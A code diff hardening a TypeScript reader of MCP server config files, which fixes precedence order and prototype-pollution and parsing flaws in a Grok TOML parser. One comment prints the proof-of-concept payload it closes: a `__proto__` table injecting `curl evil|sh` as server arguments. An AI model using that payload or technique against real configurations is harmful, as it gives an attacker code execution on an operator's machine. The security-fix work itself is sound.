@@ -67,24 +67,33 @@ export type CompatFile = {
 /**
  * Every compat file keryx will look at, in PRECEDENCE ORDER — later wins.
  *
- * Project-local before user-global within a source, matching how the
- * native readers already treat `.keryx/mcp-servers.json` versus the user
- * file: the more specific location is the more deliberate statement.
+ * The order is the SPECIFICATION'S, §2: native project, native user,
+ * then Claude, Cursor, project `.mcp.json`, Grok — highest first there,
+ * so reversed here because this list is consulted low-to-high.
  *
- * The order across sources is arbitrary in the sense that no external
- * authority sets it, and fixed in the sense that it is written here and
- * asserted by a test. An arbitrary order that is stable and documented
- * is answerable; an emergent one is not.
+ * The first version of this comment said "the order across sources is
+ * arbitrary in the sense that no external authority sets it". That was
+ * simply wrong: the specification sets it, three sections above the one
+ * I was reading, and my order inverted Claude and Cursor and promoted
+ * `.mcp.json` above Claude. The concrete cost: an operator's own
+ * `~/.claude.json` entry for `github` lost to a `github` committed in a
+ * cloned repo's `.cursor/mcp.json`.
+ *
+ * Within one source, project-local is consulted after user-global so
+ * the project wins — matching how the native readers already treat
+ * `.keryx/mcp-servers.json` versus the user file.
  */
 export function compatFiles(cwd: string, home?: string): CompatFile[] {
   const base = home ?? os.homedir();
+  // Lowest precedence first. Spec §2 ranks them Claude > Cursor >
+  // `.mcp.json` > Grok, so Grok is consulted first and Claude last.
   return [
     { source: "grok", file: path.join(base, ".grok", "config.toml"), projectLocal: false },
     { source: "grok", file: path.join(cwd, ".grok", "config.toml"), projectLocal: true },
-    { source: "claude", file: path.join(base, ".claude.json"), projectLocal: false },
     { source: "mcp.json", file: path.join(cwd, ".mcp.json"), projectLocal: true },
     { source: "cursor", file: path.join(base, ".cursor", "mcp.json"), projectLocal: false },
     { source: "cursor", file: path.join(cwd, ".cursor", "mcp.json"), projectLocal: true },
+    { source: "claude", file: path.join(base, ".claude.json"), projectLocal: false },
   ];
 }
 
@@ -179,6 +188,9 @@ export function parseGrokToml(file: string, text: string): CompatServers {
   const problems: McpConfigProblem[] = [];
 
   let current: Record<string, unknown> | undefined;
+  let currentName: string | undefined;
+  /** Servers with a line this reader could not read. They are dropped. */
+  const poisoned = new Set<string>();
 
   const lines = text.split("\n");
   for (const [index, rawLine] of lines.entries()) {
@@ -201,15 +213,64 @@ export function parseGrokToml(file: string, text: string): CompatServers {
         current = undefined;
         continue;
       }
+      currentName = name;
       const subTable = parts[2];
       const existing = servers[name];
-      current = (existing as Record<string, unknown> | undefined) ?? {};
+      // `Object.create(null)`, like the servers map and `collectEntries`.
+      //
+      // A plain `{}` here was a prototype-pollution hole with a measured
+      // path to RCE. `current["__proto__"]` reads back `Object.prototype`
+      // — truthy, so `?? {}` never fires — and `current` BECOMES
+      // `Object.prototype`; every following `key = value` writes onto it.
+      // A cloned repo's `.grok/config.toml` with
+      //
+      //   [mcp_servers.x.__proto__]
+      //   args = ["-c", "curl evil|sh"]
+      //
+      // gave every object in the process an `args`, so the operator's OWN
+      // user-scope server — which the trust gate deliberately never holds
+      // — resolved with attacker-chosen argv. `constructor` was the second
+      // door: overwriting `Object.keys` took the process down.
+      //
+      // Two of the three maps in this file already had the null prototype.
+      // The per-table objects did not, which is the same "fixed at the
+      // sites we thought of" shape as the trust gate two commits ago.
+      current = (existing as Record<string, unknown> | undefined) ?? (Object.create(null) as Record<string, unknown>);
       servers[name] = current as McpServerEntry;
       if (subTable !== undefined) {
-        const nested = (current[subTable] as Record<string, unknown> | undefined) ?? {};
+        if (subTable === "") {
+          problems.push({ file, message: `line ${lineNo}: [${header[1] as string}] has an empty sub-table name` });
+          current = undefined;
+          continue;
+        }
+        const held = Object.prototype.hasOwnProperty.call(current, subTable)
+          ? (current[subTable] as Record<string, unknown> | undefined)
+          : undefined;
+        const nested = held ?? (Object.create(null) as Record<string, unknown>);
         current[subTable] = nested;
         current = nested;
       }
+      continue;
+    }
+
+    // ANY line that opens something bracketed and is not a header we
+    // recognised above closes the current table.
+    //
+    // `[[hooks]]` is standard TOML (an array of tables) and plausible in
+    // a real Grok config. It does not match the header regex, so it fell
+    // through to the key/value parser, failed, pushed one problem — and
+    // left `current` pointing at the PREVIOUS `[mcp_servers.*]` table, so
+    // every key after it was written into that server. Measured: a
+    // `[[hooks]]` block following `[mcp_servers.docs]` replaced docs'
+    // `command` with the attacker's, and the only signal was a parse
+    // complaint about the header that said nothing about docs.
+    //
+    // The module's own header promises this parser "REFUSES what it does
+    // not understand instead of guessing". It guessed, and the guess was
+    // attacker-chosen.
+    if (line.startsWith("[")) {
+      problems.push({ file, message: `line ${lineNo}: "${line}" is not a table header this reader understands` });
+      current = undefined;
       continue;
     }
 
@@ -229,9 +290,35 @@ export function parseGrokToml(file: string, text: string): CompatServers {
         file,
         message: `line ${lineNo}: value for "${pair[1] as string}" is a TOML form this reader does not support (${pair[2] as string})`,
       });
+      // The whole SERVER is poisoned, not just this key.
+      //
+      // Reporting and continuing meant the value was simply ABSENT from
+      // the launched entry, which is the exact failure this file's header
+      // says is impossible: a multi-line array — legal TOML, unsupported
+      // here — turned
+      //
+      //   args = [
+      //     "--read-only",
+      //     "postgres://…"
+      //   ]
+      //
+      // into a server with NO args, and `mcp-postgres` launched without
+      // `--read-only`. Three problems were reported and the server ran
+      // anyway. A value this reader cannot read is a server it must not
+      // hand over.
+      if (currentName !== undefined) poisoned.add(currentName);
       continue;
     }
     current[pair[1] as string] = value;
+  }
+  for (const name of poisoned) {
+    // Dropped, and SAID SO. A server that silently vanishes is
+    // indistinguishable from one that was never configured.
+    problems.push({
+      file,
+      message: `server "${name}" was dropped: a line in its table could not be read, and a partly-read server is worse than none`,
+    });
+    delete servers[name];
   }
   return { servers, problems };
 }
